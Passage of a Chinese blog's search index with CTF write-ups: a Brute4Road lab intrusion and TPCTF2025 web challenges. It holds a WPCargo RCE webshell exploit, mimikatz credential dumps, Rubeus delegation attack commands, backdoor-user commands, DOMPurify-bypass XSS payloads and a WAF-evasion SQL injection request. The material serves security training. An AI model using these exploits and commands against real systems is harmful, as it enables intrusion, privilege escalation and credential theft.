20:12:10] [SUCCESS] 服务识别 172.22.2.16:135 =\u0026gt; 69[2025-03-17 20:12:10] [SUCCESS] 服务识别 172.22.2.3:135 =\u0026gt; 70[2025-03-17 20:12:10] [INFO] 存活端口数量: 21 71[2025-03-17 20:12:10] [INFO] 开始漏洞扫描 72[2025-03-17 20:12:10] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mssql, netbios, redis, smb, smb2, smbghost, ssh, webpoc, webtitle 73[2025-03-17 20:12:10] [SUCCESS] NetInfo 扫描结果 74目标主机: 172.22.2.3 75主机名: DC 76发现的网络接口: 77 IPv4地址: 78 └─ 172.22.2.3 79[2025-03-17 20:12:10] [SUCCESS] 网站标题 http://172.22.2.16 状态码:404 长度:315 标题:Not Found 80[2025-03-17 20:12:10] [SUCCESS] NetBios 172.22.2.34 XIAORANG\\CLIENT01 81[2025-03-17 20:12:10] [SUCCESS] 网站标题 http://172.22.2.7 状态码:200 长度:4833 标题:Welcome to CentOS 82[2025-03-17 20:12:10] [SUCCESS] NetBios 172.22.2.16 MSSQLSERVER.xiaorang.lab Windows Server 2016 Datacenter 14393 83[2025-03-17 20:12:10] [SUCCESS] NetBios 172.22.2.3 DC:DC.xiaorang.lab Windows Server 2016 Datacenter 14393 84[2025-03-17 20:12:10] [SUCCESS] NetInfo 扫描结果 85目标主机: 172.22.2.16 86主机名: MSSQLSERVER 87发现的网络接口: 88 IPv4地址: 89 └─ 172.22.2.16 90[2025-03-17 20:12:10] [SUCCESS] NetInfo 扫描结果 91目标主机: 172.22.2.34 92主机名: CLIENT01 93发现的网络接口: 94 IPv4地址: 95 └─ 172.22.2.34 96[2025-03-17 20:12:10] [SUCCESS] NetBios 172.22.2.18 WORKGROUP\\UBUNTU-WEB02 97[2025-03-17 20:12:11] [SUCCESS] 网站标题 http://172.22.2.18 状态码:200 长度:57738 标题:又一个WordPress站点 98[2025-03-17 20:12:13] [SUCCESS] Redis 172.22.2.7:6379 发现未授权访问 文件位置:/usr/local/redis/db/module.so 99[2025-03-17 20:12:17] [SUCCESS] Redis无密码连接成功: 172.22.2.7:6379 100[2025-03-17 20:12:18] [SUCCESS] 扫描已完成: 37/37 扫出来四台机子\nNetBios 172.22.2.34 XIAORANG\\CLIENT01\rNetBios 172.22.2.16 MSSQLSERVER.xiaorang.lab\rNetBios 172.22.2.3 DC:DC.xiaorang.lab\rNetBios 172.22.2.18 WORKGROUP\\UBUNTU-WEB02 WordPress 172.22.2.18上有一个wordpress服务，看看能不能从这里入手\n拿wpscan扫一下\nproxychains4 wpscan --url 172.22.2.18 --api-token my_token 扫出来一堆洞\n有个能够rce的，感觉比较好利用\n1 2 | [!] Title: WPCargo \u0026lt; 6.9.0 - Unauthenticated RCE 3 | Fixed in: 6.9.0 4 | References: 5 | - https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a 6 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25003 找一下漏洞的poc\nWPCargo \u0026lt; 6.9.0 – Unauthenticated RCE | CVE 2021-25003 | Plugin Vulnerabilities\npoc\n1import sys 2import binascii 3import requests 4 5# This is a magic string that when treated as pixels and compressed using the png 6# algorithm, will cause \u0026lt;?=$_GET[1]($_POST[2]);?\u0026gt; to be written to the png file 7payload = \u0026#39;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50\u0026#39; 8 9def encode_character_code(c: int): 10 return \u0026#39;{:08b}\u0026#39;.format(c).replace(\u0026#39;0\u0026#39;, \u0026#39;x\u0026#39;) 11 12text = \u0026#39;\u0026#39;.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:] 13 14destination_url = \u0026#39;http://127.0.0.1:8001/\u0026#39; 15cmd = \u0026#39;ls\u0026#39; 16 17# With 1/11 scale, \u0026#39;1\u0026#39;s will be encoded as single white pixels, \u0026#39;x\u0026#39;s as single black pixels. 18requests.get( 19 f\u0026#34;{destination_url}wp-content/plugins/wpcargo/includes/barcode.php?text={text}\u0026amp;sizefactor=.090909090909\u0026amp;size=1\u0026amp;filepath=/var/www/html/webshell.php\u0026#34; 20) 21 22# We have uploaded a webshell - now let\u0026#39;s use it to execute a command. 23print(requests.post( 24 f\u0026#34;{destination_url}webshell.php?1=system\u0026#34;, data={\u0026#34;2\u0026#34;: cmd} 25).content.decode(\u0026#39;ascii\u0026#39;, \u0026#39;ignore\u0026#39;)) 成功RCE，用户是www-data\n但是靶机不出网，没办法上线\n那就直接用蚁剑连\n在wordpress的配置文件中找到数据库的账号密码\n1// ** Database settings - You can get this info from your web host ** // 2/** The name of the database for WordPress */ 3define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39; ); 4 5/** Database username */ 6define( \u0026#39;DB_USER\u0026#39;, \u0026#39;wpuser\u0026#39; ); 7 8/** Database password */ 9define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;WpuserEha8Fgj9\u0026#39; ); 10 11/** Database hostname */ 12define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;127.0.0.1\u0026#39; ); 13 14/** Database charset to use in creating database tables. */ 15define( \u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8mb4\u0026#39; ); 16 17/** The database collate type. Don\u0026#39;t change this if in doubt. */ 18define( \u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39; ); wpuser/WpuserEha8Fgj9 这个机子不对外开放端口，所以我们直接用webshell管理器上的数据库管理工具连\n拿到第二个flag\nflag{c757e423-eb44-459c-9c63-7625009910d8} FLAG3 在表S0meth1ng_y0u_m1ght_1ntereSted有一堆密码\n不知道有什么用，先导出来\n注意这里用蚁剑导出之前记得将limit去掉，不然密码不全\n172.22.2.16上有mssql服务\nNetBios 172.22.2.16 MSSQLSERVER.xiaorang.lab Windows Server 2016 Datacenter 14393 用我们手上的这堆密码爆破一下\n成功拿到账号密码\nsa/ElGNkOiC 接下来直接用mdut连\n拿到nt service\\mssqlserver权限\n没找到flag，猜测需要提权。\n可以用SweetPotato提权\nC:/Users/Public/sweetpotato.exe -a \u0026#34;whoami\u0026#34; 拿到第三个flag\n=====================================\r8\u0026#34;\u0026#34;\u0026#34;\u0026#34;8 88 8\u0026#34;\u0026#34;\u0026#34;8 8 8 eeee\re e e eeeee eeee 88 8 8 eeeee eeeee eeeee 8eeee8ee 8 8 8 8 8 8 88 88 8eee8e 8 88 8 8 8 8 88 8 8eee8e 8e 8 8e 8eee 88ee88 88 8 8 8 8eee8 8e 8 88 8 88 8 88 8 88 88 88 88 8 8 8 88 8 88 8 88eeeee8 88 8 88ee8 88 88ee 88 88 8 8eee8 88 8 88ee8 flag03: flag{6fc1b639-d71c-4c8b-9747-e29074e05a7e} FLAG4 新建一个用户用rdp连上去\nnet user xrntkk Abc123456 /add\rnet localgroup administrators xrntkk /add\rREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 信息收集一下\n发现这台机子在域内\n用bloodhound做一下信息收集\nchu0的图，偷过来了![undefined (1)](../assets/undefined (1).png)\n从图中我们可以看到，MSSQLSERVER 具有对 DC 的约束性委派权限\n我们可以尝试进行约束性委派攻击\n什么是约束性委派？ 原理大致如下，参考文章：\nhttps://xz.aliyun.com/news/13854\n所以我们接下来就要尝试用mimikatz抓取hash，然后申请TGT，最后伪造S4U请求访问DC\n先传一个mimikatz.exe，管理员打开\nlog\rprivilege::Debug sekurlsa::logonpasswords exit 抓到一个用户hash\nAuthentication Id : 0 ; 95385 (00000000:00017499)\rSession : Service from 0\rUser Name : ReportServer\rDomain : NT Service\rLogon Server : (null)\rLogon Time : 2025/3/17 19:28:19\rSID : S-1-5-80-2885764129-887777008-271615777-1616004480-2722851051\rmsv :\t[00000003] Primary\r* Username : MSSQLSERVER$\r* Domain : XIAORANG\r* NTLM : 7e7c2b7d5cbee13683f637e721e4a147\r* SHA1 : d112e5ca3e3c502539058a39f153b432642aec96\rtspkg :\twdigest :\t* Username : MSSQLSERVER$\r* Domain : XIAORANG\r* Password : (null)\rkerberos :\t* Username : MSSQLSERVER$\r* Domain : xiaorang.lab\r* Password : 6c 8f 64 88 42 1e e5 dc ea 08 1f 03 05 9b e4 a5 50 70 b8 74 77 7b 50 b1 1e 80 d5 4b 0e 79 7c 9b b6 75 53 56 49 19 66 72 a9 d3 50 f8 d3 ab 0e bd e3 14 96 72 a5 fb b5 3f dc d9 ce 37 91 a2 5f d6 a1 2c 39 ea dc f3 80 e6 d2 cd c0 e6 f2 45 cd d1 80 aa f2 7f 47 09 44 ca 7d aa a0 10 c8 3c 5e e0 ae 71 77 f4 f3 1b 13 88 ab 39 68 37 41 43 e0 45 eb 6c 2d f6 fd 67 c6 ac 67 3e dd 56 71 48 b2 ed 7a f8 8c 4f d6 30 67 a2 32 8f 05 a0 2e 65 05 ce af 7d a6 c2 8e d9 c9 fc 31 6b 8e a1 7f 95 0a 2b 68 88 db 11 d9 9c f5 af 68 8c 0e ac 03 93 79 07 59 dd e6 da 42 2c 72 55 8d 3d 35 a9 85 49 90 3f 7b fb 7d b2 72 f7 76 7e ba c5 f0 98 77 fa 18 b2 b4 7c 65 d2 84 b7 8b e3 b2 fe bf 00 92 24 3b 9c b2 98 d3 5b 82 d4 d1 9f b5 aa c9 3b 54 33 26 34 ssp :\tcredman :\t先用这个账号申请一个TGT\nRubeus.exe asktgt /user:MSSQLSERVER$ /rc4:7e7c2b7d5cbee13683f637e721e4a147 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap \u0026gt; TGT.txt 结果\n______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___)\r| | \\ \\| |_| | |_) ) ____| |_| |___ |\r|_| |_|____/|____/|_____)____/(___/\rv2.3.2 [*] Action: Ask TGT\r[*] Using rc4_hmac hash: 7e7c2b7d5cbee13683f637e721e4a147\r[*] Building AS-REQ (w/ preauth) for: \u0026#39;xiaorang.lab\\MSSQLSERVER$\u0026#39;\r[*] Using domain controller: 172.22.2.3:88\r[+] TGT request successful!\r[*] base64(ticket.kirbi):\rdoIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE241tFjqrNfSoJoWlwylgM3bm183XnDyobdNuAnnh9mSDWS0SeH3+fwYgRMoAEPiDGuFo4fL+kul5qEbaYGfcl14J+SUaXE/f7JTn70xMBMfWdUS7ulBsLcLpx1xdDBgD6tvlkZAD0xrCljRUh2fYuS/5XslPN09EIOjbPDbUbeI5NOjmyFkc1kkkui9vQvTFcAn4LBWsjsmpajvNPYURpguJufgPgPcrDfsLcxdSGWoLeTdzasNYLXCdejYvH465Z56r3k6PbsBDKccsFzIeaTbaud4eHkDlW6O5xlNuQHIkNlp/THSzinnMkAh3T42u3UfxVS5cOyfgeRmkIlHTUFnrbu+Fd2h+pdawCrcedkPOyXR2nbX3iRcL1qul8TbQRInHDyBtr7LrELv+BDYlwWNHV5gB00MhCNXlTcZ6WPLBMoiMAb9LismX6i6wjgVIFpWOAt+Nn/13sz1PTC3akcG+x9GJ9I7iKH48KGNYS38B0KMyJEr402QAaYegGtv2W1vsTiumKxWCL2zOnLq3RLoFY1j72ugPYW1TgbaPrAOz8IWuWPyijEWCV4BxfzCMAHHxwvP3eJeBDRCueYvC85hJO7K5HseG6DOE0OCheBlZF0P7Zy+4su8XjOMPoK1QNcdnaBf/bGb5vci6Hm/sgEOzNtYuD+PjPNysyzge6TbGjCKW/zBCP3rZrkUL6HHby0/yP2KDXb4WZkTZmufLeEOeWYpuUS1j0zMXHIkv9aU7qhhUzznNo80Qq3bD4GSg0eh4JZTsLundidcOq8vbtv9AEfUxAp1yPCyAmB6NtfvACSZBSf7VYHtDQcta5t0DqVJ6h/gpX6uLCjwX0rITkCoUTbcR/+xavKHkWrLboa7XRKp4ZcinRy3kqCGd00qpgtryCduqhduQsMBlEOB7CeVBHTU/pjB/VpmNEWfSQSEx6SuVvf10a/tk9WKLHMukC+PGdEUp8JS3GvIMAmd3ZtC0SD0UXCZrDUhqdMs2ZjTNT4T+cBsdsdhEEt4cWq7Liktit+DR9DcJ0v6NNAQRHJA1htumPpNRsrn4YyEbjZwYuBxnJbH2rAqF1CwKsPOCtQIQhs90Fj9lz7v2ESjCXDxKm43qjwYiopWKy+4vqKNtzdcymFPme9HVPuFCnj/UwwYibvuXgwQZaNytazMd8N79wOVm3TK6TqblZUL9DaWMgBAAG5ORsUPFIaeM8XkuMwRPMX4cte7MuxK5TwOfNAOjWBBG1sIG1hit3eFXLkNWUuPLI5I2xh4YwFefKIY9p/8j3hQKga2CAU6bJDUYu3HNbHZyT9eQi1xi1KQbKUerFE+I5efaISQmVixkYGlSPIyQpGIFQdT8KeV84giD2Jefxty8Ik2W/8TGh8b2bn4bWJ1g8iMgzuurzbUEZjlf9mSWRdg8qU4PxsXcbf4Bk253/mclXVFCNojLz1RLVoj6TtJAIFw+IJG39dvcCjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBCCJ8Tx7azYeDfrUgOy2MJkoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDMxNzE1MjQ1N1qmERgPMjAyNTAzMTgwMTI0NTdapxEYDzIwMjUwMzI0MTUyNDU3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==\rServiceName : krbtgt/xiaorang.lab\rServiceRealm : XIAORANG.LAB\rUserName : MSSQLSERVER$ (NT_PRINCIPAL)\rUserRealm : XIAORANG.LAB\rStartTime : 2025/3/17 23:24:57\rEndTime : 2025/3/18 9:24:57\rRenewTill : 2025/3/24 23:24:57\rFlags : name_canonicalize, pre_authent, initial, renewable, forwardable\rKeyType : rc4_hmac\rBase64(key) : gifE8e2s2Hg361IDstjCZA==\rASREP (key) : 7E7C2B7D5CBEE13683F637E721E4A147 得到base64编码的TGT票据，利用Rubeus导入票据\nRubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE241tFjqrNfSoJoWlwylgM3bm183XnDyobdNuAnnh9mSDWS0SeH3+fwYgRMoAEPiDGuFo4fL+kul5qEbaYGfcl14J+SUaXE/f7JTn70xMBMfWdUS7ulBsLcLpx1xdDBgD6tvlkZAD0xrCljRUh2fYuS/5XslPN09EIOjbPDbUbeI5NOjmyFkc1kkkui9vQvTFcAn4LBWsjsmpajvNPYURpguJufgPgPcrDfsLcxdSGWoLeTdzasNYLXCdejYvH465Z56r3k6PbsBDKccsFzIeaTbaud4eHkDlW6O5xlNuQHIkNlp/THSzinnMkAh3T42u3UfxVS5cOyfgeRmkIlHTUFnrbu+Fd2h+pdawCrcedkPOyXR2nbX3iRcL1qul8TbQRInHDyBtr7LrELv+BDYlwWNHV5gB00MhCNXlTcZ6WPLBMoiMAb9LismX6i6wjgVIFpWOAt+Nn/13sz1PTC3akcG+x9GJ9I7iKH48KGNYS38B0KMyJEr402QAaYegGtv2W1vsTiumKxWCL2zOnLq3RLoFY1j72ugPYW1TgbaPrAOz8IWuWPyijEWCV4BxfzCMAHHxwvP3eJeBDRCueYvC85hJO7K5HseG6DOE0OCheBlZF0P7Zy+4su8XjOMPoK1QNcdnaBf/bGb5vci6Hm/sgEOzNtYuD+PjPNysyzge6TbGjCKW/zBCP3rZrkUL6HHby0/yP2KDXb4WZkTZmufLeEOeWYpuUS1j0zMXHIkv9aU7qhhUzznNo80Qq3bD4GSg0eh4JZTsLundidcOq8vbtv9AEfUxAp1yPCyAmB6NtfvACSZBSf7VYHtDQcta5t0DqVJ6h/gpX6uLCjwX0rITkCoUTbcR/+xavKHkWrLboa7XRKp4ZcinRy3kqCGd00qpgtryCduqhduQsMBlEOB7CeVBHTU/pjB/VpmNEWfSQSEx6SuVvf10a/tk9WKLHMukC+PGdEUp8JS3GvIMAmd3ZtC0SD0UXCZrDUhqdMs2ZjTNT4T+cBsdsdhEEt4cWq7Liktit+DR9DcJ0v6NNAQRHJA1htumPpNRsrn4YyEbjZwYuBxnJbH2rAqF1CwKsPOCtQIQhs90Fj9lz7v2ESjCXDxKm43qjwYiopWKy+4vqKNtzdcymFPme9HVPuFCnj/UwwYibvuXgwQZaNytazMd8N79wOVm3TK6TqblZUL9DaWMgBAAG5ORsUPFIaeM8XkuMwRPMX4cte7MuxK5TwOfNAOjWBBG1sIG1hit3eFXLkNWUuPLI5I2xh4YwFefKIY9p/8j3hQKga2CAU6bJDUYu3HNbHZyT9eQi1xi1KQbKUerFE+I5efaISQmVixkYGlSPIyQpGIFQdT8KeV84giD2Jefxty8Ik2W/8TGh8b2bn4bWJ1g8iMgzuurzbUEZjlf9mSWRdg8qU4PxsXcbf4Bk253/mclXVFCNojLz1RLVoj6TtJAIFw+IJG39dvcCjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBCCJ8Tx7azYeDfrUgOy2MJkoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDMxNzE1MjQ1N1qmERgPMjAyNTAzMTgwMTI0NTdapxEYDzIwMjUwMzI0MTUyNDU3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg== 接下来就可以和DC进行通讯了\nWIN+R\r\\\\DC.xiaorang.lab\\C$\\Users\\Administrator\\flag\\ 或者\ntype \\\\DC.xiaorang.lab\\C$\\Users\\Administrator\\flag\\flag04.txt ######: ### ######: ##\r####### ## :### ####### ##\r## :## ## .#### ## :## ##\r## ## ##.#### ## ## ####### .####: ##.## ## ## .####. :#### :###.##\r## :## ####### ## ## ####### .######: :#: ## ## :## .######. ###### :#######\r#######. ###. ## ## ## ##: :## .## ## #######: ### ### #: :## ### ###\r#######. ## ## ## ## ######## ## ## ###### ##. .## :##### ##. .##\r## :## ## ## ## ## ######## ######## ## ##. ## ## .####### ## ##\r## ## ## ## ## ## ## ######## ## ## ##. .## ## . ## ##. .##\r## :## ## ##: ### ##. ###. :# ## ## :## ### ### ##: ### ### ###\r######## ## ####### ##### .####### ## ## ##: .######. ######## :#######\r###### ## ###.## .#### .#####: ## ## ### .####. ###.## :###.##\rWell done hacking!\rThis is the final flag, you deserve it!\rflag04: flag{1c3cf693-f2fc-4f35-aece-789e66f56ecc} ","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-brute4road-writeup/","summary":"\u003cp\u003e参考文章\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://bowuchuling.github.io/posts/chunqiuBrute4Road.html\"\u003ehttps://bowuchuling.github.io/posts/chunqiuBrute4Road.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://h0ny.github.io/posts/Brute4Road-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83\"\u003ehttps://h0ny.github.io/posts/Brute4Road-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://xz.aliyun.com/news/12189#toc-6\"\u003e文章 - 浅谈约束委派攻击 - 先知社区\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch3 id=\"flag1\"\u003eFLAG1\u003c/h3\u003e\n\u003cp\u003e拿到靶机先用fscan扫一扫\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e┌──────────────────────────────────────────────┐\r\n│    ___                              _        │\r\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\r\n│  / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ /    │\r\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   \u0026lt;     │\r\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\r\n└──────────────────────────────────────────────┘\r\n      Fscan Version: 2.0.0\r\n\r\n[2025-03-17 14:12:55] [INFO] 暴力破解线程数: 1\r\n[2025-03-17 14:12:55] [INFO] 开始信息扫描\r\n[2025-03-17 14:12:55] [INFO] 最终有效主机数量: 1\r\n[2025-03-17 14:12:55] [INFO] 开始主机扫描\r\n[2025-03-17 14:12:55] [INFO] 有效端口数量: 233\r\n[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:80\r\n[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:22\r\n[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:6379\r\n[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:21\r\n[2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:22 =\u0026gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]\r\n[2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:21 =\u0026gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]\r\n[2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:80 =\u0026gt; [http] 版本:1.20.1 产品:nginx\r\n[2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:6379 =\u0026gt; [redis] 版本:5.0.12 产品:Redis key-value store\r\n[2025-03-17 14:13:06] [INFO] 存活端口数量: 4\r\n[2025-03-17 14:13:06] [INFO] 开始漏洞扫描\r\n[2025-03-17 14:13:06] [INFO] 加载的插件: ftp, redis, ssh, webpoc, webtitle\r\n[2025-03-17 14:13:06] [SUCCESS] 网站标题 http://39.98.114.207      状态码:200 长度:4833   标题:Welcome to CentOS\r\n[2025-03-17 14:13:07] [SUCCESS] 匿名登录成功!\r\n[2025-03-17 14:13:09] [SUCCESS] Redis 39.98.114.207:6379 发现未授权访问 文件位置:/usr/local/redis/db/dump.rdb\r\n[2025-03-17 14:13:13] [SUCCESS] Redis无密码连接成功: 39.98.114.207:6379\r\n[2025-03-17 14:13:18] [SUCCESS] 扫描已完成: 5/5\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e发现redis不需要密码\u003c/p\u003e","title":"春秋云镜-Brute4Road-Writeup"},{"content":" 参考文章\nhttps://blog.0xfff.team/posts/tpctf_2025_writeup/\nhttps://z3n1th1.com/2025/03/tpctf2025-writeup/\nTPCTF2025 Writeup - 星盟安全团队\nbaby layout 这是一道关于绕过DOMPurify库，进行xss cookie窃取的题目\nDOMPurify 是一个专门用于清理 HTML 输入的 JavaScript 库，旨在防止跨站脚本 (XSS) 攻击。它通过过滤和净化用户提供的 HTML 内容，确保其安全地嵌入到网页中，避免恶意代码的执行。\n在这道题中调用了DOMPurify库对content 进行 HTML 内容的净化，以防止 XSS 攻击，而且将净化后的内容替换到 layout 字符串中特定的占位符 {{content}} 处\n另外在下边的创建Layout处也会调用DOMPurify库的sanitize\nsanitize的工作原理大致如下\n那既然这两边都被进行了内容的净化，难以直接进行xss，那我们是否可以通过两者结合的方式进行xss呢\n先尝试一下这个\nlayout：\r\u0026lt;img src onerror=\u0026#34;{{content}}\u0026#34;\u0026gt;\rcontent：\ralert(1) 发现不行，因为当传入的内容为html的时候DOMPurify会对其中的元素进行解析，其中onerror为危险属性所有被净化掉了\n所以layout变成了\n\u0026lt;img src=1 \u0026gt; 但是如果我们传入的内容不为html结构的时候，DOMPurify无法对元素进行解析和净化，是可以正常传入onerror的\n所以可以这样构造payload\nlayout：\r\u0026lt;img src=\u0026#34;{{content}}\u0026#34;\u0026gt;\rcontent：\r1\u0026#34; onerror=\u0026#34;alert(1) safe-layout 这题和上一题的区别是增加了ALLOWED_ATTR: []\nconst sanitizedContent = DOMPurify.sanitize(content, { ALLOWED_ATTR: [] }); 一个类似白名单的东西。\n但是这玩意其实并不是白名单，虽然说禁用了所有的属性，但是data-*和aira-*属性还是可以正常使用的\n这篇文章中有提到：\nhttps://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists\n所以可以构造出payload\ncontent\n123\u0026#34; onload=\u0026#34;alert(1) layout\n\u0026lt;svg data-type=\u0026#34;{{content}}\u0026#34;\u0026gt;\u0026lt;/svg\u0026gt; 或者是\nlayout\n\u0026lt;svg aria-hidden=\u0026#34;{{content}}\u0026#34;\u0026gt;\u0026lt;/svg\u0026gt; safe layout revenge 这题把上题中使用的aria-*和data-*给ban掉了\n还是看上题中的那篇文章\nhttps://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#cve-2023-48219-tinymce\n在这篇文章中提到的CVE-2023-48219中，会在DOMpurify后将\\uFFFF替换为空。\n所以这里可以利用\\uFEFF对html代码进行截断，从而绕过DOMpurify\n回到这道题，我们这里也可以达到类似的效果。我们可以用{{content}}来代替\\uFEFF对html进行截断。\n所以payload就是\n//content为空\rlayout：\rx\u0026lt;style\u0026gt;\u0026lt;{{content}}/style\u0026gt;\u0026lt;{{content}}img src=x onerror=alert(123)\u0026gt;\u0026lt;/style\u0026gt; supersqli 考点：解析差异绕过和quine注入\n拿到附件\n我们可以看到这道题用go实现了一个反向代理和WAF\n1var sqlInjectionPattern = regexp.MustCompile(`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\\s+table|--|#|\\*\\/|\\/\\*)`) 2 3var rcePattern = regexp.MustCompile(`(?i)(\\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\\s*\\(.+\\))`) 4 5var hotfixPattern = regexp.MustCompile(`(?i)(select)`) 6 7var blockedUserAgents = []string{ 8\t\u0026#34;sqlmap\u0026#34;, 9\t\u0026#34;nmap\u0026#34;, 10\t\u0026#34;curl\u0026#34;, 11} 再看到urls.py\n1from django.contrib import admin 2from django.urls import path 3from blog import views 4 5urlpatterns = [ 6 path(\u0026#34;flag/\u0026#34;, views.flag, name=\u0026#34;flag\u0026#34;), 7 path(\u0026#34;\u0026#34;, views.index, name=\u0026#34;index\u0026#34;), 8] 定义了一个flag路由，指向views.py的flag函数\n跟进views\n1from django.shortcuts import render 2from django.db import connection 3 4# Create your views here. 5from django.http import HttpResponse,HttpRequest 6from .models import AdminUser,Blog 7import os 8 9def index(request:HttpRequest): 10 return HttpResponse(\u0026#39;Welcome to TPCTF 2025\u0026#39;) 11 12def flag(request:HttpRequest): 13 if request.method != \u0026#39;POST\u0026#39;: 14 return HttpResponse(\u0026#39;Welcome to TPCTF 2025\u0026#39;) 15 username = request.POST.get(\u0026#39;username\u0026#39;) 16 if username != \u0026#39;admin\u0026#39;: 17 return HttpResponse(\u0026#39;you are not admin.\u0026#39;) 18 password = request.POST.get(\u0026#39;password\u0026#39;) 19 users:AdminUser = AdminUser.objects.raw(\u0026#34;SELECT * FROM blog_adminuser WHERE username=\u0026#39;%s\u0026#39; and password =\u0026#39;%s\u0026#39;\u0026#34; % (username,password)) 20 try: 21 assert password == users[0].password 22 return HttpResponse(os.environ.get(\u0026#39;FLAG\u0026#39;)) 23 except: 24 return HttpResponse(\u0026#39;wrong password\u0026#39;) 这里存在sql注入\n所以接下来的目标就是要想办法绕过waf，进行sql注入\n可以利用multipart boundary来绕过waf，参考下面的这篇文章\nhttps://www.geekby.site/2022/03/waf-bypass/#multipart-%E6%B7%B7%E6%B7%86\n1POST /flag/ HTTP/1.1 2Host: 127.0.0.1:7788 3sec-ch-ua-mobile: ?0 4Sec-Fetch-Site: cross-site 5Upgrade-Insecure-Requests: 1 6Sec-Fetch-Dest: document 7sec-ch-ua-platform: \u0026#34;Windows\u0026#34; 8sec-ch-ua: \u0026#34;Chromium\u0026#34;;v=\u0026#34;134\u0026#34;, \u0026#34;Not:A-Brand\u0026#34;;v=\u0026#34;24\u0026#34;, \u0026#34;Google Chrome\u0026#34;;v=\u0026#34;134\u0026#34; 9Referer: http://mitm/ 10Sec-Fetch-Mode: navigate 11Sec-Fetch-User: ?1 12Accept-Language: zh-CN,zh;q=0.9 13User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 14Accept-Encoding: gzip, deflate, br, zstd 15Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 16Content-Type: multipart/form-data; boundary=a 17 18--a 19Content-Disposition: form-data; name=\u0026#34;username\u0026#34; 20 21admin 22--a 23Content-Disposition: form-data; name=\u0026#34;password\u0026#34;;filename=\u0026#34;password\u0026#34; 24Content-Disposition: form-data; name=\u0026#34;password\u0026#34;; 25 26123 27--a-- 这题我们可以使用quine注入，即构造sql语句使我们输入和输出的结果一致，从而绕过\n1assert password == users[0].password 参考文章：\nhttps://www.cnblogs.com/meraklbz/p/18169584\n生成一个payload\n1def quine(data, debug=True): 2 if debug: 3 print(data) 4 data = 